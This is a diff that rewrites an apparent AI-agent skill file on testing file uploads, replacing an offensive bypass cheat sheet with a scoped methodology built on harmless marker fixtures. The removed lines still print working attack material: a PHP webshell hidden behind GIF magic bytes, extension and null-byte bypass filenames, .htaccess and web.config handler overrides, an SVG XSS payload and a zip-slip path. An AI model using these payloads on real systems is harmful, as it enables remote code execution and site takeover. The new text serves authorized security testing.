@@ -1,105 +1,96 @@
-# SKILL: File Upload Bypass → RCE / Stored XSS / SSRF / DoS
+# File upload and processing — test the complete artifact lifecycle
 
-## Version: 1.0 | Domain: web | Trigger: `WEB MODE` + (file upload bypass → rce / stored xss / ssrf / dos) or pasted request matching this class
+## Boundary and discovery
 
----
+Use for uploads, attachments, imports, avatars, report conversions, archive extraction and generated previews.
+A filename or MIME bypass is a step, not the final security claim.
+Map create permission → acceptance → stored identity/path → processing → serving origin/headers → reader authority → revoke/delete.
+Separate bytes accepted, bytes stored, processor consumption, browser execution and server execution.
+File extension, request Content-Type and magic bytes can be checked by different components.
+A successful upload to static storage does not execute server-side code.
 
-## IDENTITY IN THIS SKILL
-I bypass MIME / extension / magic-byte / content-scan filters with polyglots, double-extensions, null bytes, archive parsing, and metadata injection.
+Record the attacker/reader roles, intended file types, storage origin, object ACL and exposed representations.
+Observe thumbnail/original/export/download routes independently.
+Capture content-type, content-disposition, nosniff, CSP and redirects on the *served* response.
+Do not infer browser behavior from the multipart request's content type.
 
----
+## Normal fixture and readback
 
-## DETECTION
-Map upload endpoint. Note allowed extensions, MIME, max size. Check whether the upload path is web-rooted and executable.
+Create a tiny legitimate file containing `AUDIT_UPLOAD_A` through the ordinary workflow.
+Prove a legitimate reader can retrieve it and an unrelated controlled actor is subject to the expected policy.
+Preserve original bytes and the transformed output if re-encoding occurs.
+Use a unique resource/path and prevent replacement of shared or existing application files.
+Use a second tiny marker fixture with one changed property for every format differential.
 
-## EXPLOITATION
-### Bypass extension filter
-```
-shell.php
-shell.PHP
-shell.pHp
-shell.php.jpg
-shell.jpg.php
-shell.php5
-shell.phtml
-shell.phar
-shell.pht
-shell.inc
-shell.php\x00.jpg
-shell.php%00.jpg
-shell.php;.jpg
-shell.php:.jpg     (NTFS alt data stream)
-shell.php/         (some servers strip trailing slash)
-shell.php.        (Windows trailing dot)
-.htaccess          (override mime exec for current dir)
-```
+## Context-specific payloads and experiments
 
-### Bypass MIME — set Content-Type
-```
-Content-Type: image/png    + body PHP code
-```
+| Boundary | Harmless challenge | Control | What counts / what does not |
+|---|---|---|---|
+| Filename versus MIME validation | Owned `audit.txt` with tiny text body and different declared MIME | Same bytes/name with correct MIME | Acceptance difference identifies a validation path, not execution. |
+| Filename canonicalization | `audit.txt.` or case variation only when observed storage/platform makes it meaningful | Canonical `audit.txt` | Compare stored name and serving behavior; trailing-dot acceptance alone has no security impact. |
+| Content sniffing / active document | Tiny SVG below, only in a permitted isolated test | SVG with no event handler | Browser marker execution in actual served context plus relevant origin/reader authority. |
+| Cross-tenant file reference | Actor A retrieves actor B's controlled private attachment id | Each actor's own successful download | Unauthorized bytes, not predictable object name or an error with 200. |
+| Processor fetch boundary | Owned document referring to a permitted controlled canary | Same document with local static content | Distinguish server-renderer fetch from browser load and scanner activity. |
+| Archive extraction | ZIP with one synthetic member path designed for an authorized lab directory | Same member at archive root | Independent extraction effect; no webshell or existing-file overwrite. |
+| Approval/preview state | Read own unapproved artifact through preview versus published route | Same flow after approved normal state | Actual intended reader policy, not simply a hidden link. |
+| Revocation/deletion | Re-read the same controlled file after authorized revoke/delete | Fresh authorized access and an unrelated nonexistent id | Test original, preview and cache separately; a temporary leak can matter. |
 
-### Bypass magic byte
-```
-GIF89a;<?php system($_GET['c']); ?>
-```
+A tiny SVG execution marker for a documented active-document surface:
 
-### Polyglot files
-- GIF + PHP polyglot
-- JPEG with PHP in EXIF comment
-- PDF + JS payload (XSS in PDF viewers)
-- SVG + XSS / XXE
-- ZIP + symlink (Zip slip)
-- Phar + polyglot for unserialize trigger
-
-### .htaccess override (Apache)
-```
-AddType application/x-httpd-php .pwn
-```
-Then upload `shell.pwn`.
-
-### web.config override (IIS)
 ```xml
-<configuration>
- <system.webServer>
-  <handlers>
-   <add name="x" path="*.config" verb="*" type="System.Web.UI.PageHandlerFactory" />
-  </handlers>
- </system.webServer>
-</configuration>
+<svg xmlns="http://www.w3.org/2000/svg" onload="document.documentElement.setAttribute('data-audit','AUDIT_MARKER')">
+  <text x="1" y="20">AUDIT_UPLOAD</text>
+</svg>
 ```
 
-### SVG XSS
-```xml
-<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
-```
+This is a conditional browser probe, not an assertion it runs in `<img>`, every viewer or every bucket.
+Avoid third-party callbacks when a local DOM marker proves the same effect.
+For a serving test, preserve the real navigation/embedding mode and reader credentials.
 
-### Zip slip
-Archive contains `../../../../var/www/html/shell.php` — extracts traversal-up.
+## Interpret browser origin correctly
 
-## PAYLOADS (real, copy-paste, grouped)
-(see above)
+SVG loaded as an image generally has different scripting behavior from a navigated active SVG document.
+HTML/SVG hosted on a separate file origin does not automatically gain the application origin's authority.
+A sandboxed viewer may have an opaque origin; inspect actual frame policy and script capabilities.
+A forced attachment download and inline document are different delivery models.
+PDF JavaScript is not interchangeable with page JavaScript and does not prove browser-origin XSS.
+If the file origin is intentionally isolated, look for a separate proven trust bridge rather than inventing one.
+Same-site cookies, CORS trust or parent-domain capabilities need their own valid browser proof.
 
-## BYPASS TECHNIQUES
-(see above — extension/MIME/magic/encoding tiers)
+## Processing and archives
 
-## CHAIN POTENTIAL
-RCE / Stored XSS / file overwrite / DoS via zip bomb.
+Keep file containers valid while mutating the part actually consumed.
+For OOXML, files such as `[Content_Types].xml` and `word/document.xml` must remain at the ZIP root with the original relationship structure.
+Do not wrap the complete parts directory as a new archive member folder.
+Use tiny files and a new synthetic extraction directory; exclude bombs and expansive recursive archives.
+Path traversal entries, symlinks and filename collisions are different hypotheses with different extractor prerequisites.
+A re-encoded image may remove active content; verify final bytes instead of assuming the original survives.
+Use `xxe_all_types.md`, `ssrf_all_types.md` or `lfi_rfi_path_traversal.md` for the specific downstream mechanism.
 
-## TOOLS
-Burp Upload Scanner, mlcsec/upload-bypass, manual Hackvertor
+## Server execution and restrictions
 
-## COMMANDS
-Burp Repeater + Upload Scanner ext
+A PHP-like extension on static storage is not an interpreter boundary.
+Uploading configuration files, webshells or persistent loaders is not a default proving step.
+If permitted execution validation is necessary, use an inert non-persistent marker and a reachable known handler.
+Record whether server behavior depends on a modified local handler/configuration; that does not prove a production exploit.
+Do not equate extension allowlist bypass with RCE, stored XSS or full tenant takeover.
 
-## EDGE CASES / NOT-A-BUG TRAPS
-Static-only buckets (S3) won't execute PHP; but XSS via SVG/HTML still works.
+## Falsification and evidence
 
-## TRIAGE ANGLE (per platform)
-Show RCE via uploaded shell + execution.
+Save accepted bytes, normal control, storage identifier, served headers and actual browser/processor result.
+Record reader role, origin, embedding mode, any user interaction and whether the content survives transformation.
+Compare unrelated actor access with an existing owned fixture, not a guessed or empty file.
+Test no-op upload, raw text rendering, sanitized/re-encoded content, isolated origin and approval policy as benign explanations.
+Capture any unauthorized read/action during a processing window even if the final artifact is rejected.
 
-## SEVERITY & CVSS
-9.8 if RCE.
+Close only the tested representation/processor/reader state when the intended boundary holds.
+Mark invalid document/unknown consumer or unavailable reader inconclusive.
+Reopen for another view, processing worker, content type, owner/tenant transition or serving policy.
 
-## REFERENCES
-PortSwigger File Upload • PayloadsAllTheThings/Upload Insecure Files
+## References and freshness
+
+Reviewed 2026-11-13. Examples require the observed file consumer; no universal MIME or extension bypass is promised.
+
+- [PortSwigger file upload](https://portswigger.net/web-security/file-upload) — acceptance versus execution and differing server-side handling.
+- [OWASP file upload](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html) — storage, validation, filename and processing boundaries.
+- [MDN Content-Disposition](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Disposition) — attachment/inline response semantics.
